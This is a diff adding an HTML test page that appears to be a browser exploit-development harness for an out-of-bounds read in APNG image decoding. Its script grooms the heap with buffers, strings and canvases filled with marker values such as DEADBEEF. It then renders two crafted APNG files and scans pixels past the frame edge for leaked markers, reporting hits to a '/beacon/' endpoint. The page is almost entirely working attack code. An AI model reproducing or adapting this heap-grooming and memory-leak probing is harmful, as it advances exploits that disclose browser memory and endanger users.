@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>V950B</title></head>
+<body><pre id="out">V950B — APNG OOB churn/interleave groom (hypothesis, B)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  try{new Image().src='/beacon/V950B-'+tag+'?d='+encodeURIComponent(String(body).slice(0,700))+'&t='+Date.now()+'&s=1';}catch(e){}
+}
+function hx(n){ var s=n.toString(16); return s.length<2?'0'+s:s; }
+function p32(d,w,x,y){ var i=(y*w+x)*4; return hx(d[i])+hx(d[i+1])+hx(d[i+2])+hx(d[i+3]); }
+function fill(u8,pat){ for(var j=0;j+3<u8.length;j+=4){u8[j]=pat[0];u8[j+1]=pat[1];u8[j+2]=pat[2];u8[j+3]=pat[3];} }
+function loadImg(src,n){ return new Promise(function(res,rej){ var im=new Image(); im.onload=function(){res(im)}; im.onerror=function(){rej(new Error('load-fail'))}; im.src=src+'?cb='+Date.now()+'_'+n+'_'+Math.random(); }); }
+var hold=[], trash=[];
+function churn(round){
+  // drop some refs to create holes, then allocate marker patterns
+  trash=[]; for(var i=0;i<hold.length;i+=3) trash.push(hold[i]); hold=[];
+  var pats=[[0x41,0x42,0x43,0x44],[0xDE,0xAD,0xBE,0xEF],[0x11,0x22,0x33,0x44],[0xCA,0xFE,0xBA,0xBE]];
+  var sizes=[512,1024,2048,4096,8192,16384,32768,65536];
+  for(var k=0;k<80;k++){
+    var sz=sizes[(k+round)%sizes.length];
+    var ab=new ArrayBuffer(sz); fill(new Uint8Array(ab), pats[k%pats.length]);
+    if(k%2===0) hold.push(ab); else trash.push(ab);
+  }
+  for(var k=0;k<30;k++){ var s=''; for(var j=0;j<100+(k%20)*40;j++) s+='ABCD'; if(k%2) hold.push(s); }
+  // small canvases/ImageData churn
+  for(var k=0;k<12;k++){
+    var c=document.createElement('canvas'); c.width=64; c.height=(k%2?64:16);
+    var ctx=c.getContext('2d'); var id=ctx.createImageData(c.width,c.height); fill(id.data,pats[k%pats.length]); ctx.putImageData(id,0,0);
+    if(k%3) hold.push(c);
+  }
+  bk('CHURN','r='+round+'|hold='+hold.length);
+}
+function scanMarkers(d,fullW,frW){
+  var rows=[0,1,2], hits={ABCD:0,DEADBEEF:0,11223344:0,CAFEBABE:0}, v=0, samp=[];
+  for(var ri=0;ri<rows.length;ri++){
+    var y=rows[ri];
+    for(var x=frW;x<=Math.min(fullW-2,frW+10);x+=2){
+      var lo=p32(d,fullW,x,y), hi=p32(d,fullW,x+1,y), q=lo+hi;
+      if(q.indexOf('41424344')!==-1) hits.ABCD++;
+      if(q.indexOf('deadbeef')!==-1) hits.DEADBEEF++;
+      if(q.indexOf('11223344')!==-1) hits['11223344']++;
+      if(q.indexOf('cafebabe')!==-1) hits.CAFEBABE++;
+      if(q!=='0000000000000000'&&q!=='aeaeaeafaeaeaeaf'&&lo!=='00ff00ff'&&lo!=='ff0000ff'){ v++; if(samp.length<4) samp.push('y'+y+'x'+x+'='+q); }
+    }
+  }
+  return {hits:hits,v:v,samp:samp};
+}
+async function one(name,src,fullW,fullH,frW,round){
+  try{
+    var im=await loadImg(src,round);
+    var c=document.createElement('canvas'); c.width=fullW; c.height=fullH;
+    var ctx=c.getContext('2d'); ctx.clearRect(0,0,fullW,fullH); ctx.drawImage(im,0,0);
+    var d=ctx.getImageData(0,0,fullW,fullH).data;
+    var r=scanMarkers(d,fullW,frW);
+    bk('SCAN',name+'#'+round+'|ABCD='+r.hits.ABCD+'|DEAD='+r.hits.DEADBEEF+'|1122='+r.hits['11223344']+'|CAFE='+r.hits.CAFEBABE+'|v='+r.v+'|s='+r.samp.join(','));
+    return r;
+  }catch(e){ bk('T-ERR',name+'#'+round+'|'+String(e&&e.message||e).slice(0,120)); return null; }
+}
+(async function(){
+  bk('BOOT','churn/interleave groom; STOP if no markers+random variation');
+  var tot={ABCD:0,DEADBEEF:0,D1122:0,CAFE:0};
+  for(var r=0;r<5;r++){
+    churn(r);
+    var a=await one('f128_fr16','v946b_f128_fr16.apng',128,64,16,r);
+    churn(r+10);
+    var b=await one('f64_fr16','v946b_f64_fr16.apng',64,64,16,r);
+    if(a){tot.ABCD+=a.hits.ABCD;tot.DEADBEEF+=a.hits.DEADBEEF;tot.D1122+=a.hits['11223344'];tot.CAFE+=a.hits.CAFEBABE;}
+    if(b){tot.ABCD+=b.hits.ABCD;tot.DEADBEEF+=b.hits.DEADBEEF;tot.D1122+=b.hits['11223344'];tot.CAFE+=b.hits.CAFEBABE;}
+  }
+  bk('TOTAL','ABCD='+tot.ABCD+'|DEAD='+tot.DEADBEEF+'|1122='+tot.D1122+'|CAFE='+tot.CAFE);
+  bk('DONE','complete|rule=markers0+random=>stop-branch');
+  say('\nV950B complete. TOTAL ABCD='+tot.ABCD+' DEAD='+tot.DEADBEEF);
+})();
+</script>
+</body></html>
